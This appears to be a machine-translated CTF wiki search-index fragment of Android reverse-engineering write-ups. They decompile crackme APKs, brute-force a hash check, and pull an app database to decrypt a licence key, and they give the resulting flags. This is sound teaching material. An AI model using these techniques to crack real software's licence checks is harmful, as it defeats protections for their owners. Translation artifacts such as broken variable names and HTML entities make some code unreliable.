( String input ) { String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" ; if ( input == null || input . length () == 0 ) { return false ; } int i ; char [] charinput = input . toCharArray (); StringBuilder v2 = new StringBuilder (); for ( char toBinaryString : charinput ) { String intinput = Integer . toBinaryString ( toBinaryString ); while ( intinput . length () < 8 ) { intinput = \"0\" + intinput ; } v2 . append ( intinput ); } while ( v2 . length () % 6 != 0 ) { v2 . append ( \"0\" ); } String v1 = String . valueOf ( v2 ); char [] v4 = new char [ ( v1 . length () / 6 ) ] ; for ( i = 0 ; i < v4 . length ; i ++ ) { int v6 = Integer . parseInt ( v1 . substring ( 0 , 6 ), 2 ); v1 = v1 . substring ( 6 ); v4 [ i ] = str . charAt ( v6 ); } StringBuilder v3 = new StringBuilder ( String . valueOf ( v4 )); if ( input . length () % 3 == 1 ) { v3 . append ( \"!?\" ); } else if ( input . length () % 3 == 2 ) { v3 . append ( \"!\" ); } if ( String . valueOf ( v3 ). equals ( \"xsZDluYYreJDyrpDpucZCo!?\" )) { return true ; } return false ; } } A quick look, in fact, is a variant of base64 encryption, we can find a base64 encoding on the Internet, and then set it up, the script used here is from http://www.cnblogs.com/crazyrunning/p/7382693 . Html. #coding=utf8 import string base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' def decode ( base64_str ): \"\"\" Decode base64 string :param base64_str:base64 string :return: the decoded bytearray; if the input parameter is not a legal base64 string, return an empty bytearray \"\"\" # Subscript index for each base64 character and convert it to 6 as a binary string base64_bytes = [ ' {:0>6} ' . format ( str ( bin ( base64_charset . index ( s ))) . replace ( '0b' , '' )) for s in base64_str if s != '=' ] resp = bytearray () nums = len ( base64_bytes ) // 4 remain = len ( base64_bytes ) % 4 integral_part = base64_bytes [ 0 : 4 * nums ] while integral_part : # Take 4 6-bit base64 characters as 3 bytes tmp_unit = '' . join ( integral_part [ 0 : 4 ]) tmp_unit = [ int ( tmp_unit [ x : x + 8 ], 2 ) for x in [ 0 , 8 , 16 ]] for i in tmp_unit : resp . append ( i ) integral_part = integral_part [ 4 :] if remain : remain_part = '' . join ( base64_bytes [ nums * 4 :]) tmp_unit = [ int ( remain_part [ i * 8 :( i + 1 ) * 8 ], 2 ) for i in range ( remain - 1 )] for i in tmp_unit : resp . append ( i ) return resp if __name__ == \"__main__\" : print decode ( 'A0NDlKJLv0hTA1lDAuZRgo==' ) Results are as follows \u279c tmp python test.py eM_5m4Li_i4_Ea5y topic \u00b6 GCTF 2017 Android1 GCTF 2017 Android2 ISG 2017 Crackme XMAN 2017 mobile3 rev1","title":"Android Java Layer Static Analysis"},{"location":"android/basic_reverse/static/java-example/#static-analysis-java-layer-example","text":"","title":"static analysis java layer example"},{"location":"android/basic_reverse/static/java-example/#2014-tinyctf-ooooooh-what-does-this-button-do","text":"","title":"2014 tinyCTF Ooooooh! What does this button do"},{"location":"android/basic_reverse/static/java-example/#determining-the-file-type","text":"Through the linux file command, you can see that the file is a compressed package. Unzip it and find that it is actually an apk file.","title":"Determining the file type"},{"location":"android/basic_reverse/static/java-example/#install-apk","text":"After installing the file, check it out. It can be seen that it is to enter a string, and then the result should pop up.","title":"Install apk"},{"location":"android/basic_reverse/static/java-example/#viewing-the-program","text":"class C00721 implements OnClickListener { C00721 () { } public void onClick ( View view ) { if ((( EditText ) MainActivity . this . findViewById ( C0073R . id . passwordField )). getText (). toString (). compareTo ( \"EYG3QMCS\" ) == 0 ) { MainActivity . this . startActivity ( new Intent ( MainActivity . this , FlagActivity . class )); } } } In the main program, you can find that if we enter the string EYG3QMCS will execute flagActivity.class. Then we can enter the following results. That is, get the flag.","title":"Viewing the program"},{"location":"android/basic_reverse/static/java-example/#2014-asis-cyber-security-contest-finals-numdroid","text":"","title":"2014 ASIS Cyber Security Contest Finals Numdroid"},{"location":"android/basic_reverse/static/java-example/#judging-file-type","text":"First use file to determine the file type, found that it is a compressed package, unzip it, get the corresponding file, and then continue to look at it, found that the file is an apk file.","title":"Judging file type"},{"location":"android/basic_reverse/static/java-example/#installer","text":"Install the program. A quick look at the page, you can find that the program is mainly to enter a password, and then log in. If you make a mistake, the message \"Wrong Password\" will pop up.","title":"Installer"},{"location":"android/basic_reverse/static/java-example/#_1","text":"Locate the key functions in the source program based on the corresponding string. According to strings.xml, we can find the variable name of the string is wrong, and then we found the following code. protected void ok_clicked () { DebugTools . log ( \"clicked password: \" + this . mScreen . getText ()); boolean result = Verify . isOk ( this , this . mScreen . getText (). toString ()); DebugTools . log ( \"password is Ok? : \" + result ); if ( result ) { Intent i = new Intent ( this , LipSum . class ); Bundle b = new Bundle (); b . putString ( \"flag\" , this . mScreen . getText (). toString (). substring ( 0 , 7 )); i . putExtras ( b ); startActivity ( i ); return ; } Toast . makeText ( this , R . string . wrong , 1 ). show (); this . mScreen . setText ( \"\" ); } Continue to locate in Verify.isOk. as follows public static boolean isOk ( Context c , String _password ) { String password = _password ; if ( _password . length () > 7 ) { password = _password . substring ( 0 , 7 ); } String r = OneWayFunction ( password ); DebugTools . log ( \"digest: \" + password + \" => \" + r ); if ( r . equals ( \"be790d865f2cea9645b3f79c0342df7e\" )) { return true ; } return false ; } It can be found that the program mainly takes the first 7 bits of the password for OneWayFunction encryption, and then compares it with be790d865f2cea9645b3f79c0342df7e. Returns true if they are equal. Here we look at OneWayFunction again, as follows private static String OneWayFunction ( String password ) { List < byte []> bytes = ArrayTools . map ( ArrayTools . select ( ArrayTools . map ( new String [] { \"MD2\" , \"MD5\" , \"SHA-1\" , \"SHA-256\" , \"SHA-384\" , \"SHA-512\" }, new AnonymousClass1 ( password )), new SelectAction < byte []> () { public boolean action ( byte [] element ) { return element != null ; } }), new MapAction < byte [] , byte []> () { public byte [] action ( byte [] element ) { int i ; byte [] b = new byte [ 8 ] ; for ( i = 0 ; i < b . length / 2 ; i ++ ) { b [ i ] = element [ i ] ; } for ( i = 0 ; i < b . length / 2 ; i ++ ) { b [ ( b . length / 2 ) + i ] = element [ ( element . length - i ) - 2 ] ; } return b ; } }); byte [] b2 = new byte [ ( bytes . size () * 8 ) ] ; for ( int i = 0 ; i < b2 . length ; i ++ ) { b2 [ i ] = (( byte [] ) bytes . get ( i % bytes . size ())) [ i / bytes . size () ] ; } try { MessageDigest digest = MessageDigest . getInstance ( \"MD5\" ); digest . update ( b2 ); byte [] messageDigest = digest . digest (); StringBuilder hexString = new StringBuilder (); for ( byte aMessageDigest : messageDigest ) { String h = Integer . toHexString ( aMessageDigest & MotionEventCompat . ACTION_MASK ); while ( h . length () < 2 ) { h = \"0\" + h ; } hexString . append ( h ); } return hexString . toString (); } catch ( NoSuchAlgorithmException e ) { return \"\" ; } } The function probably executes several hash values, but if you analyze it yourself, it is too complicated. Because the answer space ( 10^7 10^7 ) of this question is relatively small, we can take the method in the verify class and violently run it. .","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#constructor","text":"After extracting the java program, add the main function to the Verify class and fix some errors to get the corresponding answer. The corresponding code here is placed in the folder corresponding to example. It should be noted that if the corresponding hash function does not exist, the source program will skip the corresponding function. I ran all without finding it, then removed an unusual MD2 algorithm and got the answer. This shows that android should be without the md2 algorithm. After input, you get the following Then we calculate the corresponding MD value, so that the flag is ASIS_3c56e1ed0597056fef0006c6d1c52463.","title":"Constructor"},{"location":"android/basic_reverse/static/java-example/#2014-sharif-university-quals-ctf-commercial-application","text":"","title":"2014 Sharif University Quals CTF Commercial Application"},{"location":"android/basic_reverse/static/java-example/#installer_1","text":"First, install the program, just click the button, click on the button in the upper right will let us enter the key Just enter it and find that the program reports an error directly, telling us that it is wrong, then we can use this information to locate the key code.","title":"Installer"},{"location":"android/basic_reverse/static/java-example/#positioning-key-code","text":"public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\" ; public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\" ; private void checkLicenceKey ( final Context context ) { if ( this . app . getDataHelper (). getConfig (). hasLicence ()) { showAlertDialog ( context , OK_LICENCE_MSG ); return ; } View inflate = LayoutInflater . from ( context ). inflate ( C0080R . layout . propmt , null ); Builder builder = new Builder ( context ); builder . setView ( inflate ); final EditText editText = ( EditText ) inflate . findViewById ( C0080R . id . editTextDialogUserInput ); builder . setCancelable ( false ). setPositiveButton ( \"Continue\" , new OnClickListener () { public void onClick ( DialogInterface dialogInterface , int i ) { if ( KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ())) { MainActivity . this . app . getDataHelper (). updateLicence ( 2014 ); MainActivity . isRegisterd = true ; MainActivity . this . showAlertDialog ( context , MainActivity . OK_LICENCE_MSG ); return ; } MainActivity . this . showAlertDialog ( context , MainActivity . NOK_LICENCE_MSG ); } }). setNegativeButton ( & quot ; Cancel & quot ;, new C00855 ()); builder . create (). show (); } We found that, in fact, MainActivity.NOK_LICENCE_MSG stores the error string information, and then continue to read the discovery program. KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ()) To verify, if the verification is passed, the success message will be displayed.","title":"Positioning key code"},{"location":"android/basic_reverse/static/java-example/#detailed-analysis","text":"Then we carefully analyze these three parameters.","title":"Detailed analysis"},{"location":"android/basic_reverse/static/java-example/#parameter-1","text":"Parameter 1 is actually the string we entered.","title":"Parameter 1"},{"location":"android/basic_reverse/static/java-example/#parameter-2","text":"Is to use the function to get the getSecurityKey, we simply read, you can find that the program set the SecurityKey in the getConfig function public AppConfig getConfig () { boolean z = false ; AppConfig appConfig = new AppConfig (); Cursor rawQuery = this . myDataBase . rawQuery ( SELECT_QUERY , null ); if ( rawQuery . moveToFirst ()) { appConfig . setId ( rawQuery . getInt ( 0 )); appConfig . setName ( rawQuery . getString ( 1 )); appConfig . setInstallDate ( rawQuery . getString ( 2 )); if ( rawQuery . getInt ( 3 ) & gt ; 0 ) { z = true ; } appConfig . setValidLicence ( z ); appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 )); appConfig . setDesc ( rawQuery . getString ( 7 )); } return appConfig ; } Among them, the function first accessed the database, SELECT_QUERY is as follows private static String DB_NAME = \"db.db\" ; private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\" ; public static final String SELECT_QUERY = ( \"SELECT * FROM \" + TABLE_NAME + \" WHERE a=1\" ); private static String TABLE_NAME = \"config\" ; At the same time, we can get the path to the database. In further analysis, we can find that the program first gets the first line of the table config here, then sets iv to the value of the fourth column, and the key is set to the value of the fifth column. appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 ));","title":"Parameter 2"},{"location":"android/basic_reverse/static/java-example/#parameter-3","text":"In fact, parameter 3 is similar to parameter 2. I won't explain it here.","title":"Parameter 3"},{"location":"android/basic_reverse/static/java-example/#getting-the-database-file","text":"First, we need to install the apk file on the phone, and then use the following command to get adb pull /data/data/edu.sharif.ctf/databases/db.db Then use the computer to view the sqlite software to check it, here I am using http://sqlitebrowser.org/ . as follows Here we can get it directly SecurityIv=a5efdbd57b84ca36 SecurityKey=37eaae0141f1a3adf8a1dee655853714","title":"Getting the database file"},{"location":"android/basic_reverse/static/java-example/#analyze-encrypted-code","text":"public class KeyVerifier { public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\" ; public static final String VALID_LICENCE = \"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\" ; public static String bytesToHexString ( byte [] bArr ) { StringBuilder stringBuilder = new StringBuilder (); int length = bArr . length ; for ( int i = 0 ; i < length ; i ++ ) { stringBuilder . append ( String . format ( \"%02x\" , new Object [] { Integer . valueOf ( bArr [ i ] & 255 )})); } return stringBuilder . toString (); } public static String encrypt ( String str , String str2 , String str3 ) { String str4 = \"\" ; try { Key secretKeySpec = new SecretKeySpec ( hexStringToBytes ( str2 ), \"AES\" ); Cipher instance = Cipher . getInstance ( CIPHER_ALGORITHM ); instance . init ( 1 , secretKeySpec , new IvParameterSpec ( str3 . getBytes ())); str4 = bytesToHexString ( instance . doFinal ( str . getBytes ())); } catch ( Exception e ) { e . printStackTrace (); } return str4 ; } public static byte [] hexStringToBytes ( String str ) { int length = str . length (); byte [] bArr = new byte [ ( length / 2 ) ] ; for ( int i = 0 ; i < length ; i += 2 ) { bArr [ i / 2 ] = ( byte ) (( Character . digit ( str . charAt ( i ), 16 ) << 4 ) + Character . digit ( str . charAt ( i + 1 ), 16 )); } return bArr ; } public static boolean isValidLicenceKey ( String str , String str2 , String str3 ) { return encrypt ( str , str2 , str3 ). equals ( VALID_LICENCE ); } } You can see that the program first uses the encrypt function to encrypt the three strings. In fact, it is encrypted by the AES/CBC/PKCS5Padding method mentioned above, with str2 as the key and str3 as the initial vector. Then we can easily add the decryption function as follows public static String decrypt ( String input , String secretKey , String iv ) { String encryptedText = \"\" ; try { SecretKeySpec secretKeySpec = new SecretKeySpec ( hexStringToBytes ( secretKey ), \"AES\" ); Cipher cipher = Cipher . getInstance ( CIPHER_ALGORITHM ); cipher . init ( 2 , secretKeySpec , new IvParameterSpec ( iv . getBytes ())); encryptedText = bytesToHexString ( cipher . doFinal ( hexStringToBytes ( userInput ))); } catch ( Exception e ) { e . printStackTrace (); } return encryptedText ; } Then run the product key that gets the normal input fl ag-IS-see-ri-al-NU-MB-ER","title":"Analyze encrypted code"},{"location":"android/basic_reverse/static/java-example/#2015-0ctf-fiber","text":"","title":"2015-0CTF fiber"},{"location":"android/basic_reverse/static/java-example/#analysis","text":"First, analyze the code as follows public void confirm(View v) { if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals( this.et.getText().toString())) { Toast.makeText(((Context)this), \"Yes!\", 0).show(); } else { Toast.makeText(((Context)this), \"0ops!\", 0).show(); } } private String getCrc() { String v1; try { v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry( \"classes.dex\").getCrc()); } catch(Exception v0) { v0.printStackTrace (); } return v1; } private int getSig(String packageName) { int v4; PackageManager v2 = this.getPackageManager(); int v5 = 64; try { v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode(); } catch(Exception v0) { v0.printStackTrace (); } return v4; } It can be seen that the flag we want is divided into two parts. String.valueOf(this.getSig(this.getPackageName())) this.getCrc() In the first part, we can write an app to get the corresponding value. In the second part, we can extract the dex file directly and use the online tools to calculate it.","title":"Analysis"},{"location":"android/basic_reverse/static/java-example/#hashcode","text":"Just find one (put in the corresponding example folder) package com.iromise.getsignature; import android.content.pm.PackageInfo; import android.content.pm.PackageManager; import android.content.pm.Signature; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.util.Log; import android.widget.Toast; public class MainActivity extends AppCompatActivity { private StringBuilder builder; public void onCreate(Bundle savedInstanceState) { super.onCreate (savedInstanceState); setContentView(R.layout.activity_main); PackageManager manager = getPackageManager(); builder = new StringBuilder(); String pkgname = &quot;com.ctf. fiber&quot;; boolean isEmpty = TextUtils.isEmpty(pkgname); if (isEmpty) { Toast.makeText(this, &quot;The application&#39;s package name cannot be empty!&quot;, Toast.LENGTH_SHORT); } else { try { PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES); Signature[] signatures = packageInfo.signatures; Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode())); } catch (PackageManager.NameNotFoundException e) e.printStackTrace (); } } } } Then filter out the hashcode in ddms 07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537 Note: In fact, this program can be written as a small app, many programs will calculate the signature.","title":"hashcode"},{"location":"android/basic_reverse/static/java-example/#classesdex-crc32","text":"Just find an online website to get the CRC32 value of classes.dex . CRC-32 46e26557 MD5 Hash 3217b0ad6c769233ea2a49d17885b5ba SHA1 Hash ec3b4730654248a02b016d00c9ae2425379bf78f SHA256 Hash 6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8 It should be noted that this needs to be converted to decimal >>> print int(\"46E26557\", 16) 1189242199","title":"classes.dex crc32"},{"location":"android/basic_reverse/static/java-example/#flag","text":"After the two parts are finished, it is Flag. Flag\uff1a0ctf{-1839715371189242199}","title":"flag"},{"location":"android/basic_reverse/static/java-example/#2017-xman-hellosmali2","text":"Give a smali file, we can do the following ideas Smali is assembled into a dex file using smali.jar. java -jar smali.jar assemble src.smali -o src.dex Decompile dex with jadx, as follows package com.example.hellosmali.hellosmali ; public class Digest { public static boolean check ( String input ) { String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" ; if ( input == null || input . length () == 0 ) { return false ; } int i ; char [] charinput = input . toCharArray (); StringBuilder v2 = new StringBuilder (); for ( char toBinaryString : charinput ) { String intinput = Integer . toBinaryString ( toBinaryString ); while ( intinput . length () < 8 ) { intinput = \"0\" + intinput ; } v2 . append ( intinput ); } while ( v2 . length () % 6 != 0 ) { v2 . append ( \"0\" ); } String v1 = String . valueOf ( v2 ); char [] v4 = new char [ ( v1 . length () / 6 ) ] ; for ( i = 0 ; i < v4 . length ; i ++ ) { int v6 = Integer . parseInt ( v1 . substring ( 0 , 6 ), 2 ); v1 = v1 . substring ( 6 ); v4 [ i ] = str . charAt ( v6 ); } StringBuilder v3 = new StringBuilder ( String . valueOf ( v4 )); if ( input . length () % 3 == 1 ) { v3 . append ( \"!?\" ); } else if ( input . length () % 3 == 2 ) { v3 . append ( \"!\" ); } if ( String . valueOf ( v3 ). equals ( \"xsZDluYYreJDyrpDpucZCo!?\" )) { return true ; } return false ; } } A quick look, in fact, is a variant of base64 encryption, we can find a base64 encoding on the Internet, and then set it up, the script used here is from http://www.cnblogs.com/crazyrunning/p/7382693 . Html. #coding=utf8 import string base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' def decode ( base64_str ): \"\"\" Decode base64 string :param base64_str:base64 string :return: the decoded bytearray; if the input parameter is not a legal base64 string, return an empty bytearray \"\"\" # Subscript index for each base64 character and convert it to 6 as a binary string base64_bytes = [ ' {:0>6} ' . format ( str ( bin ( base64_charset . index ( s ))) . replace ( '0b' , '' )) for s in base64_str if s != '=' ] resp = bytearray () nums = len ( base64_bytes ) // 4 remain = len ( base64_bytes ) % 4 integral_part = base64_bytes [ 0 : 4 * nums ] while integral_part : # Take 4 6-bit base64 characters as 3 bytes tmp_unit = '' . join ( integral_part [ 0 : 4 ]) tmp_unit = [ int ( tmp_unit [ x : x + 8 ], 2 ) for x in [ 0 , 8 , 16 ]] for i in tmp_unit : resp . append ( i ) integral_part = integral_part [ 4 :] if remain : remain_part = '' . join ( base64_bytes [ nums * 4 :]) tmp_unit = [ int ( remain_part [ i * 8 :( i + 1 ) * 8 ], 2 ) for i in range ( remain - 1 )] for i in tmp_unit : resp . append ( i ) return resp if __name__ == \"__main__\" : print decode ( 'A0NDlKJLv0hTA1lDAuZRgo==' ) Results are as follows \u279c tmp python test.py eM_5m4Li_i4_Ea5y","title":"2017 XMAN HelloSmali2"},{"location":"android/basic_reverse/static/java-example/#topic","text":"GCTF 2017 Android1 GCTF 2017 Android2 ISG 2017 Crackme XMAN 2017 mobile3 rev1","title":"topic"},{"location":"android/basic_reverse/static/so-example/","text":"Static analysis of the native layer program \u00b6 basic method \u00b6 The basic process of static analysis of the native layer program is as follows Extract the so file ida decompile so file read so code Analyze the so code based on the code of the java layer. Assist in the analysis of the entire program based on the logic of the so code. Native layer static analysis example \u00b6 2015-Straits on both sides - an APK, try it backwards \u00b6 Decompilation \u00b6 Decompose apk with jadx to determine the main activity of the app <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" xmlns:app= \"http://schemas.android.com/apk/res-auto\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.mobicrackndk\" > <uses-sdk android:minSdkVersion= \"8\" android:targetSdkVersion= \"17\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@drawable/ic_launcher\" android:allowBackup= \"true\" > <activity android:label= \"@string/app_name\" android:name= \"com.example.mobicrackndk.CrackMe\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> </application> </manifest> It is not difficult to see that the main activity of the program is com.example.mobicrackndk.CrackMe. Analysis main activity \u00b6 It is not difficult to see that the basic situation of the program is to use the native function testFlag to determine whether the pwdEditText passed in by the user meets the requirements. public native boolean testFlag ( String str ); static { System . loadLibrary ( & quot ; mobicrackNDK & quot ;); } protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView (( int ) R . layout . activity_crack_me ); this . inputButton = ( Button ) findViewById ( R . id . input_button ); this . pwdEditText = ( EditText ) findViewById ( R . id . pwd ); this . inputButton . setOnClickListener ( new OnClickListener () { public void onClick ( View v ) { CrackMe . this . input = CrackMe . this . pwdEditText . getText (). toString (); if ( CrackMe . this . input == null ) { return ; } if ( CrackMe . this . testFlag ( CrackMe . this . input )) { Toast . makeText ( CrackMe . this , CrackMe . this . input , 1 ). show (); } else { Toast . makeText ( CrackMe . this , \"Wrong flag\" , 1 ). show (); } } }); } Analyzing so files \u00b6 Naturally we will first go directly to the testFlag function, which is not directly found. We had to analyze the JNI_Onload function first, as follows signed int __fastcall JNI_OnLoad ( JNIEnv * a1 ) { JNIEnv * v1 ; // r4 int v2 ; // r5 char * v3 ; // r7 int v4 ; // r1 const char * v5 ; // r1 int v7 ; // [sp+Ch] [bp-1Ch] v1 = a1 ; v7 = 0 ; printf ( \"JNI_OnLoad\" ); if ( (( * v1 ) -> FindClass )( v1 , & v7 , 65540 ) ) goto LABEL_7 ; v2 = v7 ; v3 = classPathName [ 0 ]; fprintf (( & _sF + 168 ), \"RegisterNatives start for '%s'\" , classPathName [ 0 ]); v4 = ( * ( v2 + 24 )) ( v2 , v3 ); if ( ! v4 ) { v5 = \"Native registration unable to find class '%s'\" ; LABEL_6 : fprintf (( & amp ; _ sF + 168 ), v5 , v3 ); LABEL_7 : fputs ( \"GetEnv failed\" , ( & _sF + 168 )); return -1 ; } if ( ( * ( * v2 + 860 ))( v2 , v4 , off_400C , 2 ) < 0 ) { v5 = \"RegisterNatives failed for '%s'\" ; goto LABEL_6 ; } return 65540 ; } It can be found that the program dynamically registers the class and the corresponding function off_400C here. Take a closer look at the function .data:0000400C off_400C DCD aTestflag ; DATA XREF: JNI_OnLoad+68\u2191o .data:0000400C ; .text:off_1258\u2191o .data: 0000400C; &quot;Test flag&quot; .data: 00004010 DCD andLjavaLangStrin_0; &quot;(Ljava / lang / String;)&quot; .data: 00004014 DCD abcdefghijklmn + 1 .data:00004018 DCD aHello ; \"hello\" .data:0000401C DCD aLjavaLangStrin_1 ; \"()Ljava/lang/String;\" .data:00004020 DCD native_hello+1 .data:00004020 ; .data ends It can be found that it is indeed the testflag function, and its corresponding function name is abcdefghijklmn. \u5206\u6790abcdefghijklmn \u00b6 It can be found that the program mainly judges the input v10 in three parts. Judgment 1 if ( strlen ( v10 ) == 16 ) Description The length of the input string is 16. Judgment 2 v3 = 0 ; do { s2 [ v3 ] = v10 [ v3 ] - v3 ; ++ v3 ; } while ( v3 != 8 ); v2 = 0 ; v12 = 0 ; if ( ! strcmp ( seed [ 0 ], s2 ) ) Judgment 3 v9 = (( * jniEnv ) -& gt ; FindClass ) (); if ( ! v9 ) { v4 = \"class,failed\" ; LABEL_11 : _android_log_print ( 4 , \"log\" , v4 ); exit ( 1 ); } v5 = (( * jniEnv ) -> GetStaticMethodID )(); if ( ! v5 ) { v4 = \"method,failed\" ; goto LABEL_11 ; } _JNIEnv :: CallStaticVoidMethod ( jniEnv , v9 , v5 ); v6 = (( * v1 ) -& gt ; GetStaticFieldID ) ( v1 , v9 , & quot ; key & quot ;, & quot ; Ljava / lang / String ; & quot ;); if ( ! v6 ) _android_log_print ( 4 , \"log\" , \"fid,failed\" ); (( * v1 ) -& gt ; GetStaticObjectField ) ( v1 , v9 , v6 ); v7 = (( * jniEnv ) -> GetStringUTFChars )(); while ( v3 < strlen ( v7 ) + 8 ) { v13 [ v3 - 8 ] = v10 [ v3 ] - v3 ; ++ v3 ; } v14 = 0 ; v2 = strcmp ( v7 , v13 ) <= 0 ; According to the assembly code, we can see that the static method in the calcKey class is called in the third judgment. ` asm .text:00001070 LDR R0, [R5] .text:00001072 LDR R2, =(aCalckey - 0x1080) .text: 00001074 LDR R3, = (aV - 0x1084) .text:00001076 LDR R4, [R0] .text:00001078 MOVS R1, #0x1C4 .text:0000107C ADD R2, PC ; \"calcKey\" .text:0000107E LDR R4, [R4,R1] .text:00001080 ADD R3, PC ; \"()V\" And after that, I got the contents of the key. ```Java public static String key; public static void calcKey() { key = new StringBuffer(\"c7^WVHZ,\").reverse().toString(); } } Get flag \u00b6 Based on these three judgments, we can get the input string content. s = & quot ; QflMn ` fH , ZHVW ^ 7 c & quot ; flag = \"\" for idx , c in enumerate ( s ): flag += chr ( ord ( c ) + idx ) print flag Results are as follows QgnPrelO4cRackEr It is not correct after the input. Again analysis \u00b6 Think about it here, the program is not where to modify the corresponding string. Here first look at the seed. Cross-referenced x and found it used in _init_my as follows size_t _init_my () { size_t i ; // r7 char * v1 ; // r4 size_t result ; // r0 for ( i = 0 ; ; ++ i ) { v1 = seed [ 0 ]; result = strlen ( seed [ 0 ]); if ( i >= result ) break ; t [ i ] = v1 [ i ] - 3 ; } seed [ 0 ] = t ; byte_4038 = 0 ; return result ; } So the original program modified the seed. Get flag again \u00b6 Modify the script as follows s = & quot ; QflMn ` fH , ZHVW ^ 7 c & quot ; flag = \"\" for idx , c in enumerate ( s ): tmp = word ( c ) if idx < 8 : tmp -= 3 flag += chr ( tmp + idx ) print flag Flag is as follows \u279c 2015- an APK on both sides of the strait, try it backwards python exp.py NdkMobiL4cRackEr Of course, this topic can also use dynamic debugging.","title":"Android Native Layer Static Analysis"},{"location":"android/basic_reverse/static/so-example/#static-analysis-of-the-native-layer-program","text":"","title":"Static analysis of the native layer program"},{"location":"android/basic_reverse/static/so-example/#basic-method","text":"The basic process of static analysis of the native layer program is as follows Extract the so file ida decompile so file read so code Analyze the so code based on the code of the java layer. Assist in the analysis of the entire program based on the logic of the so code.","title":"basic method"},{"location":"android/basic_reverse/static/so-example/#native-layer-static-analysis-example","text":"","title":"Native layer static analysis example"},{"location":"android/basic_reverse/static/so-example/#2015-straits-on-both-sides-an-apk-try-it-backwards","text":"","title":"2015-Straits on both sides - an APK, try it backwards"},{"location":"android/basic_reverse/static/so-example/#decompilation","text":"Decompose apk with jadx to determine the main activity of the app <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" xmlns:app= \"http://schemas.android.com/apk/res-auto\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.mobicrackndk\" > <uses-sdk android:minSdkVersion= \"8\" android:targetSdkVersion= \"17\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@drawable/ic_launcher\" android:allowBackup= \"true\" > <activity android:label= \"@string/app_name\" android:name= \"com.example.mobicrackndk.CrackMe\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> </application> </manifest> It is not difficult to see that the main activity of the program is com.example.mobicrackndk.CrackMe.","title":"Decompilation"},{"location":"android/basic_reverse/static/so-example/#analysis-main-activity","text":"It is not difficult to see that the basic situation of the program is to use the native function testFlag to determine whether the pwdEditText passed in by the user meets the requirements. public native boolean testFlag ( String str ); static { System . loadLibrary ( & quot ; mobicrackNDK & quot ;); } protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView (( int ) R . layout . activity_crack_me ); this . inputButton = ( Button ) findViewById ( R . id . input_button ); this . pwdEditText = ( EditText ) findViewById ( R . id . pwd ); this . inputButton . setOnClickListener ( new OnClickListener () { public void onClick ( View v ) { CrackMe . this . input = CrackMe . this . pwdEditText . getText (). toString (); if ( CrackMe . this . input == null ) { return ; } if ( CrackMe . this . testFlag ( CrackMe . this . input )) { Toast . makeText ( CrackMe . this , CrackMe . this . input , 1 ). show (); } else { Toast . makeText ( CrackMe . this , \"Wrong flag\" , 1 ). show (); } } }); }","title":"Analysis main activity"},{"location":"android/basic_reverse/static/so-example/#analyzing-so-files","text":"Naturally we will first go directly to the testFlag function, which is not directly found. We had to analyze the JNI_Onload function first, as follows signed int __fastcall JNI_OnLoad ( JNIEnv * a1 ) { JNIEnv * v1 ; // r4 int v2 ; // r5 char * v3 ; // r7 int v4 ; // r1 const char * v5 ; // r1 int v7 ; // [sp+Ch] [bp-1Ch] v1 = a1 ; v7 = 0 ; printf ( \"JNI_OnLoad\" ); if ( (( * v1 ) -> FindClass )( v1 , & v7 , 65540 ) ) goto LABEL_7 ; v2 = v7 ; v3 = classPathName [ 0 ]; fprintf (( & _sF + 168 ), \"RegisterNatives start for '%s'\" , classPathName [ 0 ]); v4 = ( * ( v2 + 24 )) ( v2 , v3 ); if ( ! v4 ) { v5 = \"Native registration unable to find class '%s'\" ; LABEL_6 : fprintf (( & amp ; _ sF + 168 ), v5 , v3 ); LABEL_7 : fputs ( \"GetEnv failed\" , ( & _sF + 168 )); return -1 ; } if ( ( * ( * v2 + 860 